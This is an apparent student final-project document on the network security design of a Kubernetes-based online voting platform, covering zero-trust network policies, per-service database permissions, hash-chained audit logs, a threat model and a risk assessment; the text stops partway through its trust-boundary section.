# U-Vote Platform: Comprehensive Network Security Documentation

> **Document Classification:** Academic Technical Documentation
> **Project:** U-Vote — Secure Online Voting Platform
> **Module:** BSc (Hons) Year 4 Final Project
> **Author:** D00255656
> **Date:** February 2026
> **Version:** 1.0
> **Scope:** Network security architecture, implementation, and verification

---

## Table of Contents

- [1. Executive Summary](#1-executive-summary)
  - [1.1 Security Posture Overview](#11-security-posture-overview)
  - [1.2 Zero-Trust Model Summary](#12-zero-trust-model-summary)
  - [1.3 Key Security Controls](#13-key-security-controls)
  - [1.4 Threat Model Overview](#14-threat-model-overview)
  - [1.5 Compliance Alignment](#15-compliance-alignment)
  - [1.6 Security Testing Summary](#16-security-testing-summary)
  - [1.7 Risk Assessment](#17-risk-assessment)
- [2. Security Architecture](#2-security-architecture)
  - [2.1 Defense in Depth Strategy](#21-defense-in-depth-strategy)
  - [2.2 Zero-Trust Model Implementation](#22-zero-trust-model-implementation)
  - [2.3 Security Zones](#23-security-zones)
- [3. Network Architecture](#3-network-architecture)
  - [3.1 Calico Architecture](#31-calico-architecture)
  - [3.2 Pod Network](#32-pod-network)
  - [3.3 Service Network](#33-service-network)
  - [3.4 Ingress Architecture](#34-ingress-architecture)
- [4. Network Policies](#4-network-policies)
  - [4.1 Policy Architecture](#41-policy-architecture)
  - [4.2 Policy-by-Policy Analysis](#42-policy-by-policy-analysis)

---

## 1. Executive Summary

### 1.1 Security Posture Overview

The U-Vote platform is a secure online voting system designed to provide verifiable,
tamper-resistant electronic elections. The platform is deployed as a distributed
microservices architecture on Kubernetes, consisting of eight application services
and one PostgreSQL database instance, all operating within the `uvote-dev` namespace
of a Kind (Kubernetes in Docker) cluster.

Network security represents the foundational defensive layer of the U-Vote platform.
The system implements a zero-trust network model where all traffic is denied by
default and only explicitly authorised communication paths are permitted. This
approach is enforced through twelve Kubernetes NetworkPolicy resources, deployed
across five YAML manifest files, and backed by the Calico Container Network
Interface (CNI) plugin version 3.26.1.

The security posture of U-Vote can be characterised by the following principles:

1. **Default Deny**: All ingress and egress traffic within the `uvote-dev` namespace
   is blocked unless an explicit NetworkPolicy grants permission. This ensures that
   no service can communicate with any other service, the database, or external
   endpoints without a deliberately authored policy.

2. **Least Privilege Network Access**: Each service is granted the minimum set of
   network connections required to fulfil its function. For example, the Frontend
   service can receive ingress traffic from the Ingress controller but cannot
   connect to the PostgreSQL database. The Results service can query the database
   but is restricted to read-only operations at the database user level.

3. **Defence in Depth**: Network policies constitute one layer within a multi-layered
   security architecture that includes application-level input validation,
   parameterised database queries, per-service database users with granular
   permissions, hash-chained audit logs, and immutable vote records enforced by
   database triggers.

4. **Micro-Segmentation**: The network is segmented at the pod level, not at the
   subnet or node level. Each microservice has its own ingress and egress rules,
   creating isolated security domains within a shared Kubernetes namespace.

The overall security posture has been validated through systematic testing of every
NetworkPolicy, confirming that authorised traffic flows succeed and unauthorised
traffic is blocked. All twelve policies passed verification testing.

### 1.2 Zero-Trust Model Summary

The U-Vote platform implements a zero-trust architecture aligned with the principles
outlined in NIST Special Publication 800-207 (Zero Trust Architecture). In a
zero-trust model, no implicit trust is granted to any entity — whether inside or
outside the network perimeter — based solely on its network location.

The following zero-trust principles are applied:

| Principle | Implementation |
|-----------|---------------|
| Never trust, always verify | Default deny NetworkPolicy blocks all traffic; every allowed flow requires an explicit policy |
| Least privilege access | Each service has only the network paths and database permissions it requires |
| Assume breach | Hash-chained audit logs detect tampering; immutable vote records prevent alteration |
| Micro-segmentation | Pod-level NetworkPolicies create per-service security boundaries |
| Explicit verification | JWT authentication for admin operations; single-use voting tokens for voter actions |
| Continuous monitoring | Audit service receives events from all backend services for centralised logging |

In a traditional perimeter-based security model, all services within the cluster
network would be able to communicate freely once traffic passes the ingress
boundary. Under the zero-trust model implemented in U-Vote, the ingress boundary
is merely the first checkpoint. Each subsequent hop — from ingress to service,
from service to database, from service to audit — requires an explicit policy
grant. A compromised service cannot pivot laterally to other services or access
the database unless that specific communication path has been whitelisted.

### 1.3 Key Security Controls

The U-Vote platform employs the following key security controls, organised by
category:

#### Network Security Controls

| Control | Description | Implementation |
|---------|-------------|----------------|
| Default Deny | All traffic blocked unless explicitly allowed | `00-default-deny.yaml` — 1 NetworkPolicy |
| DNS Allowlisting | DNS resolution restricted to cluster DNS only | `01-allow-dns.yaml` — 1 NetworkPolicy |
| Database Access Control | Only authorised services can reach PostgreSQL | `02-allow-to-database.yaml` — 2 NetworkPolicies |
| Ingress Filtering | Only ingress-nginx namespace can reach services | `03-allow-from-ingress.yaml` — 6 NetworkPolicies |
| Audit Channel Protection | Dedicated policies for audit log delivery | `04-allow-audit.yaml` — 2 NetworkPolicies |
| **Total** | **12 NetworkPolicy resources across 5 files** | |

#### Application Security Controls

| Control | Description |
|---------|-------------|
| Input Validation | Pydantic models validate all API inputs with strict type checking |
| Parameterised Queries | All database queries use parameterised statements to prevent SQL injection |
| JWT Authentication | Admin operations require valid JSON Web Tokens with expiry |
| Single-Use Voting Tokens | Each voter receives a cryptographically random token valid for one vote |
| CORS Configuration | Cross-Origin Resource Sharing restricted to authorised origins |
| Rate Limiting | API endpoints protected against brute-force and denial-of-service |

#### Data Security Controls

| Control | Description |
|---------|-------------|
| Per-Service Database Users | Six dedicated PostgreSQL users with granular table-level permissions |
| Read-Only Enforcement | Results service user (`results_service`) has SELECT-only privileges |
| Vote Immutability | Database triggers prevent UPDATE and DELETE operations on the `votes` table |
| Hash-Chained Audit Logs | Each audit log entry contains a SHA-256 hash of the previous entry |
| No Direct Database Access | Frontend and Email services have no database credentials or connectivity |

#### Audit and Monitoring Controls

| Control | Description |
|---------|-------------|
| Centralised Audit Logging | All backend services send events to the Audit service |
| Tamper Detection | Hash chain integrity can be verified to detect log manipulation |
| Internal-Only Audit Endpoint | Audit service (port 8005) is not exposed via ingress |
| Immutable Log Records | Audit log entries cannot be modified after creation |

### 1.4 Threat Model Overview

The threat model for U-Vote considers the following categories of adversaries
and attack vectors relevant to an online voting platform:

#### Threat Actors

| Actor | Capability | Motivation |
|-------|-----------|------------|
| External Attacker | Network-level attacks, web application exploitation | Disrupt election, manipulate results |
| Malicious Insider | Access to one or more service credentials | Alter votes, suppress voter participation |
| Compromised Service | Full control of one microservice pod | Lateral movement, data exfiltration, privilege escalation |
| Network Eavesdropper | Passive observation of cluster traffic | Intercept voting tokens, session data |

#### Attack Vectors and Mitigations

**Vector 1: Lateral Movement from Compromised Service**

If an attacker gains control of a single microservice (e.g., the Frontend service
through a server-side template injection), the default-deny network policies prevent
that service from communicating with any endpoint it is not explicitly authorised
to reach. The Frontend service has no database connectivity, no access to internal
services (except via the audit channel), and cannot reach other microservices
directly.

**Vector 2: Database Compromise via SQL Injection**

Even if an attacker bypasses application-level input validation, each service
connects to PostgreSQL with a dedicated user that has only the permissions required
for that service's operations. The `results_service` user can only execute SELECT
statements. The `voting_service` user can INSERT into the `votes` table but cannot
UPDATE or DELETE existing records due to database triggers.

**Vector 3: Vote Manipulation**

Votes are protected by multiple layers: the `votes` table has database triggers
that prevent UPDATE and DELETE operations; the `voting_service` database user has
INSERT-only permission on votes; and every vote operation generates an audit log
entry in a hash-chained log that would reveal any inconsistency.

**Vector 4: Audit Log Tampering**

The audit log uses a hash chain where each entry includes a SHA-256 hash of the
previous entry. Tampering with any historical log entry would break the chain,
making the manipulation detectable. The audit service is internal-only (not exposed
via ingress) and has dedicated network policies controlling which services can
send it events.

**Vector 5: Unauthorised Database Access**

Network policies restrict database connectivity to the six services that require
it. The Frontend and Email services cannot establish TCP connections to PostgreSQL
on port 5432. Even if an attacker modifies a Frontend pod's configuration to
include database credentials, the network policy will block the connection at the
CNI level before it reaches PostgreSQL.

**Vector 6: DNS Exfiltration**

DNS is allowed only to the `kube-system` namespace on port 53. This prevents
services from using DNS tunnelling to communicate with arbitrary external endpoints.
All other egress traffic is blocked by the default deny policy unless explicitly
permitted.

### 1.5 Compliance Alignment

The U-Vote security implementation aligns with the following industry standards
and frameworks. While the platform is an academic project and not subject to
formal compliance audits, these alignments demonstrate that the security design
follows established best practices.

#### OWASP Top 10 (2021) Alignment

| OWASP Category | U-Vote Mitigation |
|----------------|-------------------|
| A01: Broken Access Control | Per-service DB users, JWT auth, single-use voting tokens |
| A02: Cryptographic Failures | Hash-chained audit logs with SHA-256, secure token generation |
| A03: Injection | Parameterised queries in all services, Pydantic input validation |
| A04: Insecure Design | Zero-trust architecture, defense in depth, threat modelling |
| A05: Security Misconfiguration | Default-deny network policies, least-privilege DB permissions |
| A06: Vulnerable Components | Pinned dependency versions, minimal base images |
| A07: Identification and Authentication | JWT with expiry, bcrypt password hashing |
| A08: Software and Data Integrity | Immutable votes (DB triggers), hash-chained audit logs |
| A09: Security Logging and Monitoring | Centralised audit service with tamper detection |
| A10: Server-Side Request Forgery | Network policies block unauthorised outbound connections |

#### CIS Kubernetes Benchmark Alignment

| CIS Control | U-Vote Implementation |
|-------------|----------------------|
| 5.3.1: Network policies in use | 12 NetworkPolicy resources in `uvote-dev` namespace |
| 5.3.2: Default deny all traffic | `default-deny` policy blocks all ingress and egress |
| 5.2.1: Minimise privileged containers | No containers run as privileged |
| 5.2.6: Minimise container capabilities | Default capability set used |
| 5.7.1: Namespace isolation | Application deployed in dedicated `uvote-dev` namespace |

#### NIST SP 800-207 Zero Trust Architecture Alignment

| NIST ZTA Tenet | U-Vote Implementation |
|----------------|----------------------|
| All data sources and computing services are resources | Each microservice is treated as an independent trust boundary |
| All communication is secured regardless of location | Network policies enforce access control within the cluster |
| Access is granted on a per-session basis | Voting tokens are single-use; JWTs have expiry |
| Access is determined by dynamic policy | Kubernetes NetworkPolicies evaluated in real-time by Calico |
| Enterprise monitors and measures security posture | Audit service provides continuous event logging |
| Authentication and authorisation are strictly enforced | Multi-layer auth: ingress rules, JWT, DB user permissions |

### 1.6 Security Testing Summary

All twelve NetworkPolicy resources were tested systematically to verify both
positive (allowed traffic flows) and negative (blocked traffic is rejected)
behaviour. Testing was conducted using a combination of Kubernetes-native tools
and purpose-built test procedures.

#### Test Results Overview

| Test Category | Policy File | Policies Tested | Result |
|---------------|-------------|-----------------|--------|
| Default Deny | `00-default-deny.yaml` | 1 | PASS |
| DNS Resolution | `01-allow-dns.yaml` | 1 | PASS |
| Database Connectivity | `02-allow-to-database.yaml` | 2 | PASS |
| Ingress Access | `03-allow-from-ingress.yaml` | 6 | PASS |
| Audit Channel | `04-allow-audit.yaml` | 2 | PASS |
| **Total** | **5 files** | **12** | **ALL PASS** |

#### Test Methodology

1. **Default Deny Verification**: After applying only the default-deny policy,
   all inter-pod communication was confirmed to be blocked. DNS resolution failed,
   database connections timed out, and HTTP requests between services were rejected.

2. **DNS Resolution Verification**: After applying the DNS policy, cluster DNS
   resolution was confirmed to work (services could resolve `*.uvote-dev.svc.cluster.local`),
   while direct database connectivity remained blocked, confirming policy isolation.

3. **Database Connectivity Verification**: The six authorised services were confirmed
   to establish TCP connections to PostgreSQL on port 5432. Services without database
   access (Frontend, Email) were confirmed to time out when attempting to connect.

4. **Ingress Access Verification**: Six NetworkPolicies were confirmed to exist,
   each targeting a specific service with the correct port. Traffic from the
   `ingress-nginx` namespace was verified to reach each exposed service.

5. **Audit Channel Verification**: Bidirectional policies (ingress to audit-service
   and egress from backend services) were confirmed. All six backend services were
   verified to have network paths to the audit service on port 8005.

### 1.7 Risk Assessment

The following risk assessment identifies residual risks after the implementation
of all security controls, rated by likelihood and impact.

#### Risk Matrix

| Risk ID | Risk Description | Likelihood | Impact | Mitigation | Residual Risk |
|---------|-----------------|------------|--------|------------|---------------|
| R-01 | Lateral movement from compromised pod | Low | High | Default deny + micro-segmentation | Low |
| R-02 | SQL injection bypassing input validation | Low | Critical | Parameterised queries + per-service DB users | Very Low |
| R-03 | Vote manipulation | Very Low | Critical | DB triggers + hash-chained audit + INSERT-only user | Very Low |
| R-04 | Audit log tampering | Very Low | High | Hash chain + internal-only service + INSERT/SELECT only user | Very Low |
| R-05 | Denial of service via resource exhaustion | Medium | Medium | Rate limiting + Kubernetes resource limits | Low |
| R-06 | Credential theft (JWT/tokens) | Low | High | Token expiry + single-use tokens + HTTPS | Low |
| R-07 | DNS tunnelling for data exfiltration | Very Low | Medium | DNS restricted to kube-system namespace only | Very Low |
| R-08 | Ingress controller compromise | Low | High | Namespace isolation + per-service ingress policies | Low |
| R-09 | Container escape to host | Very Low | Critical | Kind cluster isolation + non-privileged containers | Low |
| R-10 | Database credential exposure in environment | Low | High | Per-service users limit blast radius | Low-Medium |

#### Risk Summary

The overall residual risk posture of the U-Vote platform is **Low**. The combination
of default-deny network policies, per-service database users, hash-chained audit
logs, and immutable vote records creates multiple independent layers of defence.
No single point of failure would allow an attacker to compromise the integrity of
an election without leaving detectable evidence in the audit trail.

The highest residual risks relate to operational concerns (denial of service,
credential management) rather than fundamental architectural weaknesses. These
risks are acknowledged and partially mitigated within the scope of an academic
project, with recommendations for production hardening documented in later sections.

---

## 2. Security Architecture

### 2.1 Defence in Depth Strategy

The U-Vote platform implements a defence-in-depth strategy comprising six distinct
security layers. Each layer operates independently, such that the failure or
bypass of any single layer does not grant an attacker unrestricted access to the
system. This approach is modelled on the principle that security should not depend
on a single control but rather on the cumulative effect of multiple overlapping
controls.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    LAYER 6: AUDIT & MONITORING                      │
│              Hash-chained logs · Tamper detection                    │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                 LAYER 5: IDENTITY & ACCESS                    │  │
│  │          JWT auth · Per-service DB users · Voting tokens      │  │
│  │  ┌─────────────────────────────────────────────────────────┐  │  │
│  │  │              LAYER 4: DATA SECURITY                     │  │  │
│  │  │     Hash chains · Immutability triggers · Encryption    │  │  │
│  │  │  ┌───────────────────────────────────────────────────┐  │  │  │
│  │  │  │          LAYER 3: APPLICATION SECURITY            │  │  │  │
│  │  │  │    FastAPI · Pydantic · Parameterised queries     │  │  │  │
│  │  │  │  ┌─────────────────────────────────────────────┐  │  │  │  │
│  │  │  │  │       LAYER 2: NETWORK SECURITY             │  │  │  │  │
│  │  │  │  │   Calico CNI · 12 NetworkPolicies           │  │  │  │  │
│  │  │  │  │  ┌───────────────────────────────────────┐  │  │  │  │  │
│  │  │  │  │  │   LAYER 1: INFRASTRUCTURE SECURITY    │  │  │  │  │  │
│  │  │  │  │  │  Kind cluster · Node isolation        │  │  │  │  │  │
│  │  │  │  │  └───────────────────────────────────────┘  │  │  │  │  │
│  │  │  │  └─────────────────────────────────────────────┘  │  │  │  │
│  │  │  └───────────────────────────────────────────────────┘  │  │  │
│  │  └─────────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

#### Layer 1: Infrastructure Security

**Purpose:** Provide a secure foundation for all higher-level security controls
by isolating the Kubernetes cluster environment and constraining the blast radius
of infrastructure-level compromises.

**Implementation Details:**

The U-Vote platform runs on a Kind (Kubernetes in Docker) cluster consisting of
three nodes:

| Node | Role | Purpose |
|------|------|---------|
| `uvote-control-plane` | Control Plane | Runs Kubernetes API server, scheduler, controller manager, etcd |
| `uvote-worker` | Worker | Runs application workloads (pods) |
| `uvote-worker2` | Worker | Runs application workloads (pods), provides redundancy |

The Kind cluster is configured with the following security-relevant settings:

- **Default CNI Disabled**: The cluster is created with `disableDefaultCNI: true`,
  which prevents the default kindnet CNI from being installed. This is a
  prerequisite for deploying Calico, which provides NetworkPolicy enforcement.
  Without this setting, the cluster would use kindnet, which does not support
  NetworkPolicy and would render all twelve policies inoperative.

- **Custom Pod Subnet**: The pod network is configured with `podSubnet: 192.168.0.0/16`,
  which is the default CIDR range for Calico's IPAM (IP Address Management). This
  ensures that pod IP addresses are allocated from a predictable range, simplifying
  network debugging and audit.

- **Extra Port Mappings**: Ports 80 and 443 are mapped from the host to the
  control-plane node, enabling external access to the Ingress controller. This is
  the only authorised entry point to the cluster from outside.

- **Node Isolation**: Each Kind node runs as a Docker container with its own
  network namespace. Cross-node communication occurs through a Docker bridge
  network, providing an additional layer of network isolation beyond Kubernetes
  networking.

**Security Implications:**

Kind clusters are designed for development and testing, not for production
workloads. The infrastructure layer acknowledges this limitation while
demonstrating that the security architecture is transferable to production-grade
Kubernetes distributions. The network policies, database user permissions, and
application-level controls are all Kubernetes-native and would function identically
on a production cluster (e.g., EKS, GKE, AKS, or bare-metal Kubernetes with
Calico).

The control plane is isolated on a dedicated node, which prevents application
workloads from directly accessing etcd, the Kubernetes API server's backend
storage. In a production environment, this separation would be enforced through
physical or virtual machine boundaries rather than Docker container boundaries.

#### Layer 2: Network Security

**Purpose:** Enforce communication boundaries between all components at the
network level, ensuring that only explicitly authorised traffic flows are
permitted regardless of application-level configuration.

**Implementation Details:**

Network security is implemented through two primary mechanisms:

1. **Calico CNI (v3.26.1)**: Calico is deployed as the Container Network Interface
   plugin, replacing the default kindnet. Calico provides three critical
   capabilities:
   - **NetworkPolicy Enforcement**: Calico translates Kubernetes NetworkPolicy
     resources into iptables/eBPF rules on each node, enforcing traffic filtering
     at the kernel level.
   - **IP Address Management (IPAM)**: Calico manages pod IP allocation from the
     `192.168.0.0/16` subnet, assigning each pod a unique IP address.
   - **Pod-to-Pod Routing**: Calico establishes routes between nodes using BGP
     (Border Gateway Protocol) or VXLAN encapsulation, enabling pods on different
     nodes to communicate.

2. **Kubernetes NetworkPolicies (12 resources)**: Twelve NetworkPolicy resources
   define the complete set of authorised communication paths within the
   `uvote-dev` namespace. These policies are organised into five files with a
   numeric ordering convention:

   | File | Policies | Function |
   |------|----------|----------|
   | `00-default-deny.yaml` | 1 | Block all traffic (baseline) |
   | `01-allow-dns.yaml` | 1 | Allow DNS resolution |
   | `02-allow-to-database.yaml` | 2 | Allow database connectivity |
   | `03-allow-from-ingress.yaml` | 6 | Allow ingress controller access |
   | `04-allow-audit.yaml` | 2 | Allow audit log delivery |

   The numeric prefix establishes a logical ordering that mirrors the conceptual
   layering: deny everything first, then allow DNS (required for service discovery),
   then allow database access, then allow external ingress, and finally allow
   internal audit communication.

**Security Implications:**

Network policies operate at Layer 3/4 (IP and TCP/UDP), which means they are
enforced before application code executes. Even if an application contains a
vulnerability that could be exploited to make arbitrary network connections,
the network policy will block any connection that is not explicitly permitted.

This is particularly important for the Frontend service, which handles untrusted
user input (HTTP requests from the public internet). Even if the Frontend service
were fully compromised through a server-side vulnerability, the attacker could
not:
- Connect to the PostgreSQL database (no database egress policy for Frontend)
- Connect to other microservices directly (no inter-service egress policy)
- Exfiltrate data to an external server (no general egress policy)
- Establish reverse shells to external hosts (all egress blocked except DNS)

The attacker would be confined to the Frontend pod's network sandbox, able to
communicate only with the DNS server and the Audit service.

#### Layer 3: Application Security

**Purpose:** Validate and sanitise all inputs at the application boundary,
preventing injection attacks, type confusion, and other application-level
exploits from reaching business logic or data stores.

**Implementation Details:**

Each microservice is built with FastAPI, a Python web framework that provides
automatic input validation through integration with Pydantic:

- **Pydantic Models**: Every API endpoint defines a Pydantic model specifying the
  expected types, formats, and constraints for request bodies, query parameters,
  and path parameters. Invalid inputs are rejected with a 422 Unprocessable Entity
  response before reaching any business logic.

- **Parameterised Queries**: All database interactions use parameterised SQL
  queries (prepared statements). User-supplied values are passed as parameters to
  the database driver, not interpolated into SQL strings. This eliminates SQL
  injection as an attack vector at the application level, regardless of whether
  the input validation layer is bypassed.

- **Type Safety**: FastAPI's dependency injection system and Pydantic's strict
  type checking ensure that values flowing through the application are of the
  expected types. A string cannot be passed where an integer is expected, a
  negative number cannot be used as a vote count, and an improperly formatted
  UUID will be rejected before it reaches the database.

**Security Implications:**

Application-level security controls complement network-level controls by
providing defence against attacks that operate within authorised network paths.
For example, the Voting service is authorised by network policy to connect to the
database. If an attacker exploits a vulnerability in the Voting service, network
policies cannot prevent them from interacting with the database. However,
parameterised queries prevent SQL injection, Pydantic validation prevents malformed
inputs, and the per-service database user restricts the attacker to INSERT on
`votes` and SELECT on `elections`/`candidates`. The database trigger further
prevents modification of existing vote records.

#### Layer 4: Data Security

**Purpose:** Protect the integrity and confidentiality of stored data through
cryptographic controls, access restrictions, and immutability guarantees that
operate independently of application logic.

**Implementation Details:**

- **Hash-Chained Audit Logs**: The `audit_logs` table implements a hash chain
  where each record contains a `previous_hash` field holding the SHA-256 hash of
  the preceding log entry. This creates a tamper-evident sequence: modifying any
  historical entry would produce a hash mismatch with the subsequent entry,
  detectable through a simple chain verification query.

  ```
  Entry N-1:  { data: "...", hash: SHA256(Entry N-2) }
                        │
                        ▼
  Entry N:    { data: "...", hash: SHA256(Entry N-1) }    ← hash references N-1
                        │
                        ▼
  Entry N+1:  { data: "...", hash: SHA256(Entry N) }      ← hash references N
  ```

  If Entry N-1 is modified after the fact, the stored hash in Entry N will no
  longer match the recalculated hash of Entry N-1, revealing the tampering.

- **Vote Immutability**: The `votes` table has PostgreSQL triggers that intercept
  and reject any UPDATE or DELETE operation. Once a vote record is inserted, it
  cannot be modified or removed through any SQL operation, regardless of the
  user's database permissions. This is enforced at the database engine level,
  below the application layer.

  ```sql
  -- Trigger function that prevents modification of vote records
  CREATE OR REPLACE FUNCTION prevent_vote_modification()
  RETURNS TRIGGER AS $$
  BEGIN
      RAISE EXCEPTION 'Vote records cannot be modified or deleted';
      RETURN NULL;
  END;
  $$ LANGUAGE plpgsql;
  ```

- **Per-Service Database Credentials**: Each service that requires database access
  is provisioned with a dedicated PostgreSQL user. These users have table-level
  and operation-level permissions that restrict their access to exactly the tables
  and operations required by the service.

**Security Implications:**

Data-layer security controls provide the final line of defence against data
manipulation. Even if an attacker compromises both the network policies (gaining
unauthorised database access) and the application code (bypassing input validation),
they would still face database-level restrictions: triggers prevent vote
modification, the hash chain detects audit log tampering, and per-service users
limit the scope of any compromise.

#### Layer 5: Identity and Access Management

**Purpose:** Authenticate users and services, authorise operations based on
verified identity, and ensure that access tokens are scoped, time-limited, and
resistant to replay attacks.

**Implementation Details:**

The U-Vote platform implements three distinct identity and access management
mechanisms, each serving a different actor type:

| Mechanism | Actor | Purpose | Lifetime |
|-----------|-------|---------|----------|
| JWT Tokens | Administrators | Authenticate admin API requests | Time-limited (expiry) |
| Voting Tokens | Voters | Authorise a single vote submission | Single-use (consumed on vote) |
| Database Users | Services | Authenticate service-to-database connections | Persistent (per-service) |

- **JWT Authentication**: Administrator operations (creating elections, managing
  candidates, viewing results) require a valid JSON Web Token issued by the Auth
  service. JWTs include an expiry timestamp, preventing the use of stolen tokens
  after a defined period. The Auth service is the sole issuer of JWTs, and the
  token signing key is not shared with other services.

- **Single-Use Voting Tokens**: Each voter receives a cryptographically random
  token that authorises exactly one vote submission. When a voter casts their vote,
  the token is consumed (marked as used) in the same database transaction as the
  vote insertion. This prevents double-voting even if a voter attempts to reuse
  the same token. The token validation and vote casting are performed atomically
  to prevent race conditions.

- **Per-Service Database Users**: Six PostgreSQL users provide service-level
  authentication to the database. Each user's permissions are scoped to the
  minimum set of tables and operations required:

  | DB User | Tables | Permissions |
  |---------|--------|-------------|
  | `auth_service` | `admins` | SELECT, INSERT, UPDATE |
  | `election_service` | `elections` | SELECT, INSERT, UPDATE, DELETE |
  | `voting_service` | `votes`, `elections`, `candidates`, `voting_tokens` | INSERT (votes), SELECT (elections, candidates), UPDATE (voting_tokens) |
  | `results_service` | `votes`, `elections`, `candidates` | SELECT only |
  | `audit_service` | `audit_logs` | INSERT, SELECT |
  | `admin_service` | `voters`, `candidates`, `voting_tokens` | SELECT, INSERT, UPDATE, DELETE |

**Security Implications:**

The three-tiered identity model ensures that no single credential compromise
grants complete system access. Stealing an administrator's JWT allows API-level
operations but does not grant direct database access. Compromising a service's
database credentials allows database operations within that user's permissions
but does not grant access to other services' data or administrative functions.
Intercepting a voting token allows casting one vote but does not grant
administrative access or the ability to view results.

#### Layer 6: Audit and Monitoring

**Purpose:** Maintain an immutable, tamper-evident record of all security-relevant
events, enabling post-incident investigation and providing a deterrent against
insider threats.

**Implementation Details:**

The Audit service (port 8005) is an internal-only service that receives event
notifications from all six backend services. It is not exposed via the Ingress
controller, meaning it cannot be accessed from outside the cluster.

The audit architecture has the following characteristics:

- **Centralised Collection**: All backend services (Auth, Election, Voting,
  Results, Admin, Email) send audit events to the Audit service over HTTP on
  port 8005. Each event includes the source service, event type, timestamp, and
  relevant details.

- **Hash Chain Integrity**: Each audit log entry is linked to the previous entry
  via a SHA-256 hash, forming a blockchain-like chain. The integrity of the entire
  log can be verified by recomputing hashes from the first entry to the last.

- **Append-Only Storage**: The `audit_service` database user has only INSERT and
  SELECT permissions on the `audit_logs` table. It cannot UPDATE or DELETE
  existing entries. This is enforced at the database user permission level.

- **Network-Protected Delivery**: Dedicated NetworkPolicies (`04-allow-audit.yaml`)
  create a protected channel between backend services and the Audit service. The
  ingress policy on the Audit service accepts traffic only from pods matching the
  six backend service labels. The egress policy on the backend services allows
  outbound traffic only to the Audit service on port 8005.

**Security Implications:**

The audit layer provides non-repudiation and forensic capability. If an election
result is disputed, the audit log can be examined to trace every operation that
affected the election: creation, candidate registration, voter token generation,
vote casting, and result tallying. The hash chain ensures that this log has not
been altered since the events were recorded. The combination of network isolation
(internal-only), database restrictions (INSERT/SELECT only), and cryptographic
integrity (hash chain) makes the audit log highly resistant to tampering.

### 2.2 Zero-Trust Model Implementation

#### 2.2.1 Principles Applied

The zero-trust implementation in U-Vote follows the core principle that trust is
never assumed and must always be verified. This section details how each zero-trust
principle manifests in the platform's architecture.

**Principle 1: Explicit Verification**

Every network connection is verified against NetworkPolicy rules before it is
permitted. There is no concept of a "trusted zone" where traffic flows freely.
Even within the `uvote-dev` namespace, a pod must have an explicit NetworkPolicy
grant to communicate with any other pod.

Verification occurs at multiple levels:

```
Request Flow:
  Client → Ingress Controller → [NetworkPolicy Check] → Service Pod
  Service Pod → [NetworkPolicy Check] → PostgreSQL
  Service Pod → [NetworkPolicy Check] → Audit Service

Each arrow (→) represents a verification point where the traffic must match
an explicit allow policy or it will be dropped.
```

**Principle 2: Least Privilege**

Each component is granted the minimum access necessary for its function:

| Component | Network Access | Database Access | Notes |
|-----------|---------------|-----------------|-------|
| Frontend | Ingress IN, Audit OUT | None | No database credentials or network path |
| Auth Service | Ingress IN, DB OUT, Audit OUT | admins (S,I,U) | Cannot access votes, elections |
| Election Service | Ingress IN, DB OUT, Audit OUT | elections (S,I,U,D) | Cannot access votes, admins |
| Voting Service | Ingress IN, DB OUT, Audit OUT | votes (I), elections (S), candidates (S), tokens (U) | Cannot DELETE votes |
| Results Service | Ingress IN, DB OUT, Audit OUT | votes (S), elections (S), candidates (S) | Read-only, no writes |
| Audit Service | Backend IN, DB OUT | audit_logs (I,S) | Internal only, no ingress exposure |
| Admin Service | Ingress IN, DB OUT, Audit OUT | voters (S,I,U,D), candidates (S,I,U,D), tokens (S,I,U,D) | Cannot access votes directly |
| Email Service | Audit OUT | None | SMTP outbound only, no DB, internal only |

*Legend: S=SELECT, I=INSERT, U=UPDATE, D=DELETE*

**Principle 3: Assume Breach**

The architecture is designed with the assumption that any single component may be
compromised. The blast radius of a compromise is contained through:

- **Network isolation**: A compromised pod cannot reach services it is not authorised
  to access. The Frontend service, if compromised, cannot pivot to the database.

- **Database user scoping**: A compromised service's database credentials grant
  access only to the tables and operations that service requires. Compromising the
  Results service grants read-only access to votes, elections, and candidates — it
  cannot modify any data.

- **Audit trail preservation**: The Audit service is isolated from external access,
  and its database user can only INSERT and SELECT. Even if the service that
  generated an audit event is later compromised, the historical audit records
  remain intact and verifiable.

The following table illustrates the blast radius for each service if compromised:

| Compromised Service | Can Access | Cannot Access |
|---------------------|-----------|---------------|
| Frontend | Audit service only | Database, all other services |
| Auth Service | admins table (S,I,U), Audit | votes, elections, voters, candidates |
| Election Service | elections table (S,I,U,D), Audit | votes, admins, voters |
| Voting Service | votes (I), elections (S), candidates (S), tokens (U), Audit | admins, voters, audit_logs |
| Results Service | votes (S), elections (S), candidates (S), Audit | Cannot write anything |
| Audit Service | audit_logs (I,S) | All other tables, no external access |
| Admin Service | voters, candidates, tokens (S,I,U,D), Audit | votes, admins, elections |
| Email Service | Audit service only | Database, all other services |

#### 2.2.2 Trust Boundaries

The U-Vote platform defines five trust boundaries, each representing a transition
where the trust level changes and additional verification is required:

```
Trust Boundary Diagram:

  UNTRUSTED          BOUNDARY 1         SEMI-TRUSTED        BOUNDARY 2
  ┌──────────┐    ┌─────────────┐    ┌──────────────┐    ┌─────────────┐
  │ Internet │───▶│   Ingress   │───▶│   Frontend   │───▶│   Backend   │
  │  Users   │    │  Controller │    │   Service    │    │  Services   │
  └──────────┘    └─────────────┘    └──────────────┘    └─────────────┘
                                                               │
                                          BOUNDARY 3           │
                                     ┌─────────────┐          │
                                     │  PostgreSQL  │◀─────────┘
                                     │   Database   │
                                     └─────────────┘
                                           │
                                      BOUNDARY 4
                                     ┌─────────────┐
                                     │  Per-Table   │
                                     │ Permissions  │
                                     └─────────────┘
                                           │
                                      BOUNDARY 5
                                     ┌─────────────┐
                                     │   DB-Level   │
                                     │   Triggers   │
                                     └─────────────┘
```

**Boundary 1: Internet to Ingress Controller**

The Ingress controller is the only entry point from the public internet into the
cluster. It operates in the `ingress-nginx` namespace, separate from the
application namespace. Traffic crosses this boundary through the Kind
`extraPortMappings` on ports 80 and 443.

**Boundary 2: Ingress Controller to Application Services**

The Ingress controller routes traffic to specific services based on URL path
matching. NetworkPolicies in `03-allow-from-ingress.yaml` explicitly define which
services accept traffic from the `ingress-nginx` namespace. The Audit and Email
services do not have ingress policies, making them invisible to external traffic.

**Boundary 3: Application Services to Database**

Network policies in `02-allow-to-database.yaml` control which services can
establish TCP connections to PostgreSQL on port 5432. Only six of the eight
services are permitted to connect. Each connection authenticates with a
service-specific PostgreSQL user.

